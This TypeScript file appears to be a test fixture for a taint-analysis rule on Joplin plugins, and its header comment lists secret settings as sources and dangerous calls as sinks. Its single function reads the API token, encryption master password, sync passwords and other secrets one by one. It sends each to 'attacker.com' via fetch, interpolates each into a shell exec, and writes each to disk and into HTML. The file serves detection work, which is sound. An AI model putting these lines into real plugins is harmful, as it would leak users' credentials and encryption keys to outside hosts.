import * as joplin from 'api';
import * as directCp from 'child_process';
import fetch from 'node-fetch';
import * as fsNative from 'fs';

// FROM : 
// joplin.settings.globalValue(x) or joplin.settings.globalValues([x]) where x is :
// 'api.token' / 'encryption.masterPassword' / 'encryption.cachedPpk' / 'encryption.passwordCache' / 'syncInfoCache' / 'sync.5.password' / 'sync.6.auth' / 'sync.9.context' / 'sync.10.userEmail' / 'sync.userId' / 'clientId'
// 
// TO : 
// fetch / writeFileSync / exec / put / setHtml / register / userDataSet

async function triggerRule() {
    const s1 = await joplin.settings.globalValue('api.token');
    fetch('http://attacker.com/?t=' + s1);
    fsNative.writeFileSync(s1, 'data');
    fsNative.writeFileSync('/tmp/out', s1);
    directCp.exec('echo ' + s1);
    await joplin.data.put(['notes', '1'], null, { title: s1 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s1 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s1);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s1);

    const s2 = await joplin.settings.globalValue('encryption.masterPassword');
    fetch('http://attacker.com/?t=' + s2);
    fsNative.writeFileSync(s2, 'data');
    fsNative.writeFileSync('/tmp/out', s2);
    directCp.exec('echo ' + s2);
    await joplin.data.put(['notes', '1'], null, { title: s2 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s2 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s2);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s2);

    const s3 = await joplin.settings.globalValue('encryption.cachedPpk');
    fetch('http://attacker.com/?t=' + s3);
    fsNative.writeFileSync(s3, 'data');
    fsNative.writeFileSync('/tmp/out', s3);
    directCp.exec('echo ' + s3);
    await joplin.data.put(['notes', '1'], null, { title: s3 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s3 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s3);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s3);

    const s4 = await joplin.settings.globalValue('encryption.passwordCache');
    fetch('http://attacker.com/?t=' + s4);
    fsNative.writeFileSync(s4, 'data');
    fsNative.writeFileSync('/tmp/out', s4);
    directCp.exec('echo ' + s4);
    await joplin.data.put(['notes', '1'], null, { title: s4 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s4 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s4);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s4);

    const s5 = await joplin.settings.globalValue('syncInfoCache');
    fetch('http://attacker.com/?t=' + s5);
    fsNative.writeFileSync(s5, 'data');
    fsNative.writeFileSync('/tmp/out', s5);
    directCp.exec('echo ' + s5);
    await joplin.data.put(['notes', '1'], null, { title: s5 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s5 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s5);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s5);

    const s6 = (await joplin.settings.globalValues(['api.token']))['api.token'];
    fetch('http://attacker.com/?t=' + s6);
    fsNative.writeFileSync(s6, 'data');
    fsNative.writeFileSync('/tmp/out', s6);
    directCp.exec('echo ' + s6);
    await joplin.data.put(['notes', '1'], null, { title: s6 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s6 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s6);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s6);

    const s7 = await joplin.settings.globalValue('sync.5.password');
    fetch('http://attacker.com/?t=' + s7);
    fsNative.writeFileSync(s7, 'data');
    fsNative.writeFileSync('/tmp/out', s7);
    directCp.exec('echo ' + s7);
    await joplin.data.put(['notes', '1'], null, { title: s7 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s7 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s7);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s7);

    const s8 = await joplin.settings.globalValue('sync.6.auth');
    fetch('http://attacker.com/?t=' + s8);
    fsNative.writeFileSync(s8, 'data');
    fsNative.writeFileSync('/tmp/out', s8);
    directCp.exec('echo ' + s8);
    await joplin.data.put(['notes', '1'], null, { title: s8 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s8 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s8);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s8);

    const s9 = await joplin.settings.globalValue('sync.9.context');
    fetch('http://attacker.com/?t=' + s9);
    fsNative.writeFileSync(s9, 'data');
    fsNative.writeFileSync('/tmp/out', s9);
    directCp.exec('echo ' + s9);
    await joplin.data.put(['notes', '1'], null, { title: s9 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s9 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s9);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s9);

    const s10 = await joplin.settings.globalValue('sync.10.userEmail');
    fetch('http://attacker.com/?t=' + s10);
    fsNative.writeFileSync(s10, 'data');
    fsNative.writeFileSync('/tmp/out', s10);
    directCp.exec('echo ' + s10);
    await joplin.data.put(['notes', '1'], null, { title: s10 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s10 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s10);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s10);

    const s11 = await joplin.settings.globalValue('sync.userId');
    fetch('http://attacker.com/?t=' + s11);
    fsNative.writeFileSync(s11, 'data');
    fsNative.writeFileSync('/tmp/out', s11);
    directCp.exec('echo ' + s11);
    await joplin.data.put(['notes', '1'], null, { title: s11 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s11 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s11);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s11);

    const s12 = await joplin.settings.globalValue('clientId');
    fetch('http://attacker.com/?t=' + s12);
    fsNative.writeFileSync(s12, 'data');
    fsNative.writeFileSync('/tmp/out', s12);
    directCp.exec('echo ' + s12);
    await joplin.data.put(['notes', '1'], null, { title: s12 });
    await joplin.views.panels.setHtml('panel1', '<div>' + s12 + '</div>');
    await joplin.contentScripts.register('type' as any, 'id1', s12);
    await joplin.data.userDataSet(['notes', '1'], 'cache', s12);
}

triggerRule();